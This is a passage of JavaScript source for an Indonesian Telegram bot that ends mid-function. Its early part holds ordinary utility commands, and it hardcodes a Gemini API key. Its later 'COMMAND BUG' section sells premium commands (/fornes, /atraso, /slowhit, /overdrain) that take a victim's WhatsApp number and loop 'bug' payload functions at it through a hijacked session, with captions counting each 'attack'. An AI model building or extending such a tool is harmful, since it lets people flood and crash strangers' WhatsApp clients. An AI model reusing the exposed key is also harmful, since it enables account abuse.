    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    // API expects numeric 1/0 for boolean query params (safer)
    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated ? 1 : 0}&delay=${encodeURIComponent(delay)}`;

    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
      timeout: 15000, // 15s timeout
      headers: { 'Accept': 'application/octet-stream' },
    });

    if (!response || response.status !== 200 || !response.data) {
      console.error('Brat API returned bad response:', response && response.status);
      return bot.sendMessage(chatId, 'Gagal membuat stiker brat (API error). Coba lagi nanti.');
    }

    const buffer = Buffer.from(response.data);

    if (buffer.length < 10) {
      console.error('Brat API returned too small payload');
      return bot.sendMessage(chatId, 'Gagal membuat stiker brat (payload tidak valid).');
    }

    // Telegram biasanya deteksi WebP/GIF, tapi sertakan filename supaya lebih andal
    // Jika animated -> kirim sebagai .gif, kalau bukan -> .webp
    const filename = isAnimated ? 'brat.gif' : 'brat.webp';

    await bot.sendSticker(chatId, buffer, { filename });

  } catch (error) {
    console.error('❌ Error brat:', error && (error.response?.data || error.message || error));
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "HTML" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "HTML" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Nih hasilnya By : @zencxv`,
      parse_mode: "HTML",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

const GEMINI_API_KEY = process.env.GEMINI_API_KEY || "AIzaSyAXVsajmVfnZYFpaIO1cEfvEYoEmFypomo"; //Apikey gw anj jgn lu sebar paok ku dell nanti asu

const extMap = {
  javascript: "js",
  js: "js",
  python: "py",
  py: "py",
  html: "html",
  css: "css",
  json: "json",
  cpp: "cpp",
  c: "c",
  java: "java",
  php: "php",
  go: "go",
  ruby: "rb",
  txt: "txt"
};

function extractCodeBlocks(text) {
  const regex = /```(\w+)?\n([\s\S]*?)```/g;
  let match;
  const blocks = [];

  while ((match = regex.exec(text)) !== null) {
    const lang = match[1]?.toLowerCase() || "txt";
    const code = match[2].trim();
    blocks.push({ lang, code });
  }

  return blocks;
}

bot.onText(/\/ai (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const prompt = match[1];

  bot.sendMessage(chatId, "⏳wait sabar pertanyaan lo ga berbobot anjg.....");

  try {
    const res = await axios.post(
      "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent",
      {
        contents: [{ parts: [{ text: prompt }] }],
        generationConfig: {
          temperature: 0.9,
          maxOutputTokens: 8192
        }
      },
      {
        headers: {
          "Content-Type": "application/json",
          "X-goog-api-key": GEMINI_API_KEY
        }
      }
    );

    const reply =
      res.data.candidates?.[0]?.content?.parts?.[0]?.text ||
      "⚠️ Tidak ada jawaban";

    const codeBlocks = extractCodeBlocks(reply);

    if (codeBlocks.length > 0) {
      for (let i = 0; i < codeBlocks.length; i++) {
        const { lang, code } = codeBlocks[i];
        const ext = extMap[lang] || "txt";
        const filename = `code_${Date.now()}_${i + 1}.${ext}`;

        fs.writeFileSync(filename, code);

        await bot.sendDocument(chatId, filename, {
          caption: `
mdai: code ${lang.toUpperCase()} dari blok ke ${i + 1}`
        });

        fs.unlinkSync(filename);
      }
      const explanation = reply.replace(/```[\s\S]*?```/g, "").trim();
      if (explanation) {
        if (explanation.length > 3500) {
          const filename = `penjelasan_${Date.now()}.txt`;
          fs.writeFileSync(filename, explanation);

          await bot.sendDocument(chatId, filename, {
            caption: "ai: Penjelasan terlalu panjang gw kirim via document ya kntl"
          });

          fs.unlinkSync(filename);
        } else {
          bot.sendMessage(chatId, explanation);
        }
      }
    } else if (reply.length > 3500) {
      const filename = `jawaban_${Date.now()}.txt`;
      fs.writeFileSync(filename, reply);

      await bot.sendDocument(chatId, filename, {
        caption: "ai: Jawaban nya panjang gw kirim via document ya kntl"
      });

      fs.unlinkSync(filename);
    } else {
      bot.sendMessage(chatId, reply);
    }
  } catch (err) {
    console.error(err.response?.data || err.message);
    bot.sendMessage(
      chatId,
      `❌ Error: ${err.response?.data?.error?.message || err.message}`
    );
  }
});

// ============================
// 💬 FITUR: /chatowner & /replyuser (lintas bot)
// ============================

// Konfigurasi
const DEVELOPER_ID = 6578213381;

// ==================================================
// 📨 /chatowner — User kirim pesan ke Owner
// ==================================================
bot.onText(/^\/chatowner(?:\s+(.+))?/, async (msg, match) => {
  const userId = msg.from?.id;
  const chatId = msg.chat?.id;
  const username = msg.from?.username ? `@${msg.from.username}` : "Tanpa Username";
  const messageText = (match?.[1] || "").trim();
  const time = moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");
  const domain = process.env.HOSTNAME || os.hostname();

  if (!messageText) {
    return bot.sendMessage(chatId, "⚠️ Format salah.\nGunakan: /chatowner <isi pesan>");
  }

  try {
    const messageToOwner = `
💌 *Pesan Baru untuk Owner*
━━━━━━━━━━━━━━━━━━━
👤 *Username:* ${username}
🆔 *User ID:* \`${userId}\`
🌐 *Server:* \`${domain}\`
🕒 *Waktu:* ${time}

💬 *Isi Pesan:*
${messageText}
━━━━━━━━━━━━━━━━━━━

📩 Balas dengan:
/replyuser <user_id> <token_bot_tujuan> <pesan>
`;

    const messageToUser = `
✅ Pesan kamu sudah dikirim ke owner bot.
🕒 Waktu: ${time}
Terima kasih atas masukannya! 💡
`;

    // Kirim ke Owner
    await bot.sendMessage(DEVELOPER_ID, messageToOwner, { parse_mode: "Markdown" });

    // Konfirmasi ke User
    await bot.sendMessage(chatId, messageToUser, { parse_mode: "Markdown" });

    console.log(`📩 Pesan dari ${username} (${userId}) dikirim ke owner.`);
  } catch (err) {
    console.error("❌ Error di /chatowner:", err.response?.data || err.message);
  }
});


// ==================================================
// 🔁 /replyuser — Owner balas ke user lintas bot
// ==================================================
bot.onText(/^\/replyuser\s+(\d+)\s+(\S+)\s+([\s\S]+)/, async (msg, match) => {
  const senderId = msg.from?.id;

  if (senderId !== DEVELOPER_ID) {
    return bot.sendMessage(msg.chat.id, "🚫 Kamu tidak punya izin memakai perintah ini.");
  }

  const userId = match[1];
  const targetToken = match[2];
  const replyText = match[3];
  const time = moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");

  try {
    // Kirim balasan lintas bot
    await axios.post(`https://api.telegram.org/bot${targetToken}/sendMessage`, {
      chat_id: userId,
      text: `📬 *Balasan dari Owner Bot:*\n\n${replyText}\n\n🕒 ${time}`,
      parse_mode: "Markdown",
    });

    await bot.sendMessage(
      msg.chat.id,
      `✅ Pesan terkirim ke user *${userId}* lewat bot token:\n\`${targetToken}\``,
      { parse_mode: "Markdown" }
    );

    console.log(`📤 Owner membalas user ${userId} lewat bot lain.`);
  } catch (err) {
    console.error("❌ Gagal kirim balasan lintas bot:", err.response?.data || err.message);
    await bot.sendMessage(msg.chat.id, "❌ Gagal mengirim balasan (token atau ID salah).");
  }
});

bot.onText(/^\/info$/i, async (msg) => {
  const chatId = msg.chat.id;
  const fromUser = msg.from;
  const targetUser = msg.reply_to_message?.from || msg.from;

  // 🧠 Ambil data utama (fix kutip + fallback)
  const firstName = targetUser.first_name || "";
  const lastName = targetUser.last_name || "";
  const name = `${firstName} ${lastName}`.trim() || "Tidak diketahui";

  const username = targetUser.username ? `@${targetUser.username}` : "Tidak ada username";
  const userId = targetUser.id;
  const isBot = targetUser.is_bot ? "🤖 Ya, Bot" : "👤 Tidak, User";
  const isPremium = targetUser.is_premium ? "💎 Ya (User Premium)" : "⚪ Tidak";
  const language = targetUser.language_code ? targetUser.language_code.toUpperCase() : "Tidak diketahui";

  const dateNow = new Date().toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    dateStyle: "full",
    timeStyle: "short",
  });

  // 🏷️ Tentukan konteks tampilan
  const contextText =
    targetUser.id === fromUser.id
      ? "👤 *Profil Kamu Sendiri*"
      : "🧾 *Profil Pengguna*";

  // Siapkan tombol (fix: harus dideclare dulu)
  const buttons = [];

  if (targetUser.id !== fromUser.id && targetUser.username) {
    buttons.push([{ text: "📨 Chat User", url: `https://t.me/${targetUser.username}` }]);
  }

  // 💬 Format pesan info user
  const profileText = `
╭───〔 ✨ ${contextText} ✨ 〕─────✦
│ 🪪 *Nama:* ${name}
│ 🌐 *Username:* ${username}
│ 🆔 *ID:* \`${userId}\`
│ 🤖 *Bot:* ${isBot}
│ 💎 *Premium:* ${isPremium}
│ 💬 *Bahasa:* ${language}
╰──────────────────────────✦

📅 *Diperiksa oleh:* [${fromUser.first_name}](tg://user?id=${fromUser.id})
🕒 *Waktu:* ${dateNow}
`;

  try {
    // 🖼️ Ambil foto profil user
    const photos = await bot.getUserProfilePhotos(targetUser.id, { limit: 1 });

    if (photos.total_count > 0) {
      const fileId = photos.photos[0][0].file_id;

      await bot.sendPhoto(chatId, fileId, {
        caption: profileText,
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: buttons },
        reply_to_message_id: msg.message_id,
      });
    } else {
      // Tidak ada foto profil
      await bot.sendMessage(chatId, profileText, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: buttons },
        reply_to_message_id: msg.message_id,
      });
    }
  } catch (err) {
    console.error("❌ Gagal ambil foto profil:", err.message);

    await bot.sendMessage(chatId, profileText, {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons },
      reply_to_message_id: msg.message_id,
    });
  }
});

bot.onText(/\/spotify (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  let loading;

  try {
    // Loading aesthetic
    loading = await bot.sendMessage(chatId, `
<b>✨ Spotify Finder</b>
<i>Listening to the universe...</i>
`, { parse_mode: "HTML" });

    // Fetch API
    const api = `https://api.nekolabs.my.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api);

    // Delete loading
    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, `
<b>❌ Not Found</b>
<i>The sound you seek is not in this realm.</i>
`, { parse_mode: "HTML" });
    }

    const { metadata, downloadUrl } = data.result;
    const { title, artist, cover, duration } = metadata;

    // Aesthetic Premium Caption
    const caption = `
<blockquote><pre>
┏━━ SPOTIFY • SEARCH ━━━━┓
┃ 🎧 TITLE: <i>${title}</i>
┃ 👤 ARTIST: <i>${artist}</i>
┃ ⏱ DURATION: <i>${duration}</i>
┗━━━━━━━━━━━━━━━━━━━━━━┛</pre></blockquote>
`;

    // Send cover
    await bot.sendPhoto(chatId, cover, {
      caption,
      parse_mode: "HTML"
    });

    // Send audio
    await bot.sendAudio(chatId, downloadUrl, {
      title: title,
      performer: artist
    });

  } catch (err) {
    console.error(err);
    
    if (loading) {
      try { await bot.deleteMessage(chatId, loading.message_id); } catch {}
    }

    bot.sendMessage(chatId, `
<b>⚠ Error</b>
<i>Something went wrong…</i>
`, { parse_mode: "HTML" });
  }
});

// Command awal
bot.onText(/^\/sticker$/, async (msg) => {
  const chatId = msg.chat.id;

  // HARUS reply foto
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(
      chatId,
      "🖼️ *Sticker Maker*\n\n" +
      "Untuk membuat stiker, silakan *reply foto* yang ingin dijadikan stiker.\n\n" +
      "Contoh:\n👉 Kirim foto\n👉 Reply foto tersebut dengan mengetik /sticker",
      { parse_mode: "Markdown" }
    );
  }

  try {
    bot.sendMessage(chatId, "⏳ Sedang membuat stiker... tunggu sebentar ya!");

    const photo = msg.reply_to_message.photo.pop(); // resolusi tertinggi
    const fileId = photo.file_id;

    // Ambil file Telegram
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download sementara
    const res = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const tempPath = `./sticker_${chatId}.jpg`;
    fs.writeFileSync(tempPath, Buffer.from(res.data));

    // Kirim sebagai stiker
    await bot.sendSticker(chatId, fs.createReadStream(tempPath));

    // Hapus file sementara
    fs.unlink(tempPath, () => {});

    bot.sendMessage(chatId, "✅ Stiker berhasil dibuat!\nSelamat menikmati 😄");

  } catch (err) {
    console.error("❌ Error:", err.message);
    bot.sendMessage(
      chatId,
      "⚠️ *Gagal membuat stiker.*\nSilakan coba lagi atau gunakan foto lain.",
      { parse_mode: "Markdown" }
    );
  }
});

// =======================================
//            API PRIMARY + FALLBACK
// =======================================
const API_ENDPOINTS = {
  nulis: [
    {
      name: "Lemon Write",
      url: "https://lemon-write.vercel.app/api/generate-book",
    },
    {
      name: "Nekonulis",
      url: "https://api.nekonulis.xyz/api/nulis",
    },
  ],
};


// =======================================
//            SIMPLE RUNTIME
// =======================================
const activeUsers = new Set();
const lastSeen = new Map();
const userState = new Map();


// =======================================
//            HELPER FUNCTIONS
// =======================================
async function safeSendMessage(chatId, text, options = {}) {
  try {
    return await bot.sendMessage(chatId, text, options);
  } catch (err) {
    console.error("safeSendMessage:", err?.message || err);
  }
}

async function safeEditMessageText(chatId, messageId, text, options = {}) {
  try {
    return await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: messageId,
      ...options,
    });
  } catch (err) {
    console.error("safeEditMessageText:", err?.message || err);
  }
}


// =======================================
//          CORE FUNCTION (NULIS)
// =======================================
async function createNulis(text, chatId) {
  if (!text || !text.trim()) {
    return "❌ Mohon masukkan teks yang ingin Anda tulis.";
  }

  for (const api of API_ENDPOINTS.nulis) {
    try {
      console.log(`🖋️ Menggunakan API: ${api.name}`);

      const payload = { text, font: "default", color: "#000000", size: "28" };

      const response = await axios.post(api.url, payload, {
        responseType: "arraybuffer",
        headers: { "Content-Type": "application/json" },
        timeout: 20000,
      });

      if (!response?.data || response.data.byteLength === 0) {
        console.log(`⚠️ API ${api.name} mengembalikan buffer kosong.`);
        continue;
      }

      const buffer = Buffer.from(response.data);

      await bot.sendPhoto(chatId, buffer, {
        caption: `✍️ Tulisan tangan berhasil dibuat!\n📘 Sumber API: *${api.name}*`,
        parse_mode: "Markdown",
      });

      return "✅ Teks berhasil dibuat dan dikirim.";
    } catch (err) {
      console.error(`❌ Error dari API ${api.name}:`, err.message);
    }
  }

  return "❌ Semua API gagal merespons. Silakan coba lagi nanti.";
}


// =======================================
//           COMMAND HANDLER /nulis
// =======================================
bot.onText(/^\/nulis(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match && match[1] ? match[1].trim() : "";

  activeUsers.add(msg.from.id);
  lastSeen.set(msg.from.id, Date.now());

  if (!text) {
    return safeSendMessage(
      chatId,
      "Silakan kirim *teks* yang ingin Anda tulis.\n\nContoh:\n`/nulis Aku sayang kamu ❤️`",
      { parse_mode: "Markdown" }
    );
  }

  const loading = await safeSendMessage(
    chatId,
    "⏳ Sedang menulis di buku...\nMohon tunggu sebentar 📝"
  );

  await bot.sendChatAction(chatId, "upload_photo");

  const result = await createNulis(text, chatId);

  if (loading) {
    await safeEditMessageText(
      loading.chat.id,
      loading.message_id,
      "✅ Selesai menulis!"
    );
  }

  await safeSendMessage(chatId, result);
  userState.delete(chatId);
});


// =======================================
//            SYSTEM SHUTDOWN
// =======================================
process.on("SIGINT", () => {
  console.log("Bot dihentikan...");
  bot.stopPolling();
  process.exit();
});

// === DETEKSI COMMAND DI PRIVATE ===

bot.on("message", async (msg) => {
  const chatType = msg.chat.type;

  // Cek apakah pesan mengandung text dan merupakan command
  if (!msg.text || !msg.text.startsWith("/")) return;

  // Ambil command
  const command = msg.text.split(" ")[0];

  // USER yang pakai command
  const userId = msg.from.id;

  // Jika command digunakan di PRIVATE chat
  if (chatType === "private") {

    // JANGAN kirim notif jika user adalah LOG_CHAT (pemilik log)
    if (userId === Number(LOG_CHAT)) return;

    const username = msg.from.username ? `@${msg.from.username}` : "-";
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    bot.sendMessage(
      LOG_CHAT,
      `
🔔 <b>Private Command Used</b>

👤 User: <b>${msg.from.first_name} (${msg.from.id})</b>
🏷 Username : <b>${username}</b>

📥 Command:
<b>${command}</b>

💬 Full Message:
<b>${msg.text}</b>

📍 Chat : PRIVATE
⏰ Time : ${waktu}
      `,
      { parse_mode: "HTML" }
    );
  }
});

//─────COMMAND BUG─────\\
bot.onText(/\/fornes (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const db = loadDB();
  const username = msg.from.username ? `@${msg.from.username}` : "Anomali misterius";

  const LOOP_COUNT = 55;
  const DELAY_MS = 3000;

  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  if (!db.premiums.some(p => String(p.id) === String(userId))) {
    return bot.sendMessage(chatId, "❌ Anda terdeteksi bukan Premium User.");
  }

  if (shouldIgnoreMessage(msg)) {
    return bot.sendMessage(chatId, "AOWKWOWK YATIM", { parse_mode: "HTML" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Sabar ya, ${cooldown} detik sebelum mengirim lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "Sayang sekali sender belum terpasang mohon ketik /connect 628xx untuk memasang sender❗️");
    }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/bk5cbk.jpg", {
      caption: `
\`\`\`
ッ Username : ${username}
ッ Target : ${formattedNumber}
ッ Loop : ${LOOP_COUNT}x
ッ Status : Process... 🔃
ッ Loading : [░░░░░░░░░░] 0%
\`\`\`
`,
      parse_mode: "HTML",
    });

    const progressStages = [
      { text: "[█░░░░░░░░░] 10%", delay: 200 },
      { text: "[███░░░░░░░] 30%", delay: 200 },
      { text: "[█████░░░░░] 50%", delay: 150 },
      { text: "[███████░░░] 70%", delay: 150 },
      { text: "[█████████░] 90%", delay: 100 },
      { text: "[██████████] 100%", delay: 200 },
    ];

    for (let i = 1; i <= LOOP_COUNT; i++) {
      console.log(`\x1b[36m[Vlood ${i}/${LOOP_COUNT}]\x1b[0m Mengirim bug ke ${formattedNumber}`);

      for (const stage of progressStages) {
        await sleep(stage.delay);
        await bot.editMessageCaption(
          `
\`\`\`
ッ Username : ${username}
ッ Target : ${formattedNumber}
ッ Type : Delay WhatsApp
ッ Loop : ${i}/${LOOP_COUNT} 
ッ Status : Sending... 🔄
ッ Loading : ${stage.text}
ッ Date : ${date}
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "HTML",
          }
        );
      }

      await Xaramzy(target);
      await DelayPayload(target);
      await gsInter(target);
      await ZenoDelayLoca(target);

      if (i < LOOP_COUNT) {
        await sleep(DELAY_MS);
      if ((i + 1) % 40 === 0) {
    console.log("Bot Istirahat 2 menit.....");
    await new Promise((resolve) => setTimeout(resolve, 120000));
      }
   }
}

    console.log("\x1b[32m[SUCCESS]\x1b[0m Semua Pesan Terkirim!");

    await bot.editMessageCaption(
      `
\`\`\`
ッ Username : ${username}
ッ Target : ${formattedNumber}
ッ Type : Delay WhatsApp
ッ Status : Succes ✅️
ッ Total Serangan : ${LOOP_COUNT}x
ッ Loading : [██████████] 100%
ッ Date : ${date}
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/atraso(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const db = loadDB();
  const date = getCurrentDate();
  const cooldown = checkCooldown(userId);

  // =============================
  // 1. FORMAT CHECK
  // =============================
  if (!match || !match[1] || !/^\d{8,}$/.test(match[1])) {
    return bot.sendMessage(chatId, `🪧 ☇ Format: /atraso 62×××`);
  }

  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  // =============================
  // 2. IGNORE CHECK
  // =============================
  if (shouldIgnoreMessage(msg)) {
    return bot.sendMessage(chatId, "AOWKWOWK YATIM", { parse_mode: "HTML" });
  }

  // =============================
  // 3. PREMIUM CHECK
  // =============================
  if (!db.premiums.some(p => String(p.id) === String(userId))) {
    return bot.sendMessage(
      chatId,
      `<blockquote>「 🦠 𝐀𝐭𝐥𝐚𝐧𝐭𝐢𝐜 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 .ᐟ」</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🕊 Informasi", url: "https://t.me/AtlanticBlood" }]
          ]
        }
      }
    );
  }

  // =============================
  // 4. COOLDOWN CHECK
  // =============================
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Sabar ya, ${cooldown} detik sebelum mengirim lagi.`);
  }

  // =============================
  // 5. WA SESSION CHECK (FIXED QUOTE ERROR)
  // =============================
  if (sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu."
    );
  }

  // =============================
  // 6. OPSI GROUP ONLY
  // =============================
  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  // Helper delay random
  const randomSleep = (min, max) =>
    new Promise(resolve =>
      setTimeout(resolve, Math.floor(Math.random() * (max - min + 1)) + min)
    );

  // =============================
  // 7. SEND PESAN AWAL (randomImage → URL FIXED)
  // =============================
  const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/bk5cbk.jpg", {
    caption: `
<blockquote><pre>┌─────────────────────────┐
│「 🦠 Atlantic ☇ Bug System 」     
├─────────────────────────┤
│ Target  : ${formattedNumber}  
│ Command : atraso              
│ Status  : Proses              
│ Date    : ${date}             
├─────────────────────────┤
│「 Atlantic ☇ Blood 」
└─────────────────────────┘</pre></blockquote>
`,
    parse_mode: "HTML"
  });

  // =============================
  // 8. EKSEKUSI BUG
  // =============================
  try {
    await randomSleep(800, 1500);
    await polygonX(target);

    await randomSleep(700, 1300);
    await protocoldelay10(sock, target, true);

    await randomSleep(700, 1300);
    await OtaxAyunBelovedX(sock, target);

    console.log(chalk.red(`Succes Standing Bugs [ Atlantic Blood ]`));

    // =============================
    // 9. UPDATE STATUS BERHASIL
    // =============================
    await bot.editMessageCaption(
      `
<blockquote><pre>┌─────────────────────────┐
│「 🦠 Atlantic ☇ Bug System 」     
├─────────────────────────┤
│ Target  : ${formattedNumber}  
│ Command : atraso              
│ Status  : Successfully Sending Bug             
│ Date    : ${date}             
├─────────────────────────┤
│「 Atlantic ☇ Blood 」
└─────────────────────────┘</pre></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🥑 Проверить цели", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/slowhit(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // CEK FORMAT INPUT
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `🪧 ☇ Format: /slowhit 62×××`);
  }

  const number = match[1].replace(/[^0-9]/g, "");
  const target = `${number}@s.whatsapp.net`;
  
  // VALIDASI NOMOR
  if (number.length < 8) {
    return bot.sendMessage(chatId, "⚠️ Nomor tidak valid.");
  }

  // =============================
  //  PREMIUM CHECK
  // =============================
  if (!db.premiums.some(p => String(p.id) === String(userId))) {
    return bot.sendMessage(
      chatId,
      `<blockquote>「 🦠 𝐀𝐭𝐥𝐚𝐧𝐭𝐢𝐜 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 .ᐟ」</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🕊 Informasi", url: "https://t.me/AtlanticBlood" }]
          ]
        }
      }
    );
  }
  
  // =============================
  if (sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu."
    );
  }

  // KIRIM STATUS AWAL
  await bot.sendMessage(
    chatId,
    `
<b>Target:</b> ${number}@s.whatsapp.net
<b>Status:</b> <i>Delay sedang dikirim...⏳</i>
`,
    { parse_mode: "HTML" }
  );

  // RANDOM SLEEP
  function randomSleep(min, max) {
    return new Promise(resolve =>
      setTimeout(resolve, Math.floor(Math.random() * (max - min + 1)) + min)
    );
  }

  //EKSEKUSI SLOWHIT
  try {
    for (let i = 0; i < 5; i++) {
      await XmagicMachine(target);
      await randomSleep(1000, 1500);
      await IxCore(target);
      await randomSleep(1500, 2500);
      await galaxyMessage(sock, target);
      await randomSleep(1500, 2500);
    }

    await bot.sendMessage(
      chatId,
      `✅ <b>Delay Berhasil Dikirim!</b>\n\n<b>Target:</b> ${number}@s.whatsapp.net\n<i>Eksekusi Slowhit selesai.</i>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    bot.sendMessage(chatId, "❌ Error: " + err.message);
    console.error("❌ Error Slowhit:", err);
  }
});

bot.onText(/\/overdrain(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const db = loadDB();
  const date = getCurrentDate();
  const cooldown = checkCooldown(userId);

  // =============================
  // 1. FORMAT CHECK
  // =============================
  if (!match || !match[1] || !/^\d{8,}$/.test(match[1])) {
    return bot.sendMessage(chatId, `🪧 ☇ Format: /overdrain 62×××`);
  }

  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  // =============================
  // 2. IGNORE CHECK
  // =============================
  if (shouldIgnoreMessage(msg)) {
    return bot.sendMessage(chatId, "AOWKWOWK YATIM", { parse_mode: "HTML" });
  }

  // =============================
  // 3. PREMIUM CHECK
  // =============================
  if (!db.premiums.some(p => String(p.id) === String(userId))) {
    return bot.sendMessage(
      chatId,
      `<blockquote>「 🦠 𝐀𝐭𝐥𝐚𝐧𝐭𝐢𝐜 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 .ᐟ」</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🕊 Informasi", url: "https://t.me/AtlanticBlood" }]
          ]
        }
      }
    );
  }

  // =============================
  // 4. COOLDOWN CHECK
  // =============================
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Sabar ya, ${cooldown} detik sebelum mengirim lagi.`);
  }

  // =============================
  // 5. WA SESSION CHECK (FIXED QUOTE ERROR)
  // =============================
  if (sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu."
    );
  }

  // =============================
  // 6. OPSI GROUP ONLY
  // =============================
  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  // Helper delay random
  const randomSleep = (min, max) =>
    new Promise(resolve =>
      setTimeout(resolve, Math.floor(Math.random() * (max - min + 1)) + min)
    );

  // =============================
  // 7. SEND PESAN AWAL (randomImage → URL FIXED)
  // =============================
  const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/bk5cbk.jpg", {
    caption: `
<blockquote><pre>┌─────────────────────────┐
│「 🦠 Atlantic ☇ Bug System 」     
├─────────────────────────┤
│ Target  : ${formattedNumber}  
│ Command : overdrain              
│ Status  : Proses              
│ Date    : ${date}             
├─────────────────────────┤
│「 Atlantic ☇ Blood 」
└─────────────────────────┘</pre></blockquote>
`,
    parse_mode: "HTML"
  });

  // ——————————————————————————————
  // 8. EKSEKUSI BUG
  // ——————————————————————————————
  try {
    await randomSleep(800, 1500);

    for (let i = 0; i < 30; i++) {
      await bulldozerX(target);
      await invisXAlbum(sock, target);
      await randomSleep(500, 1500);
    }

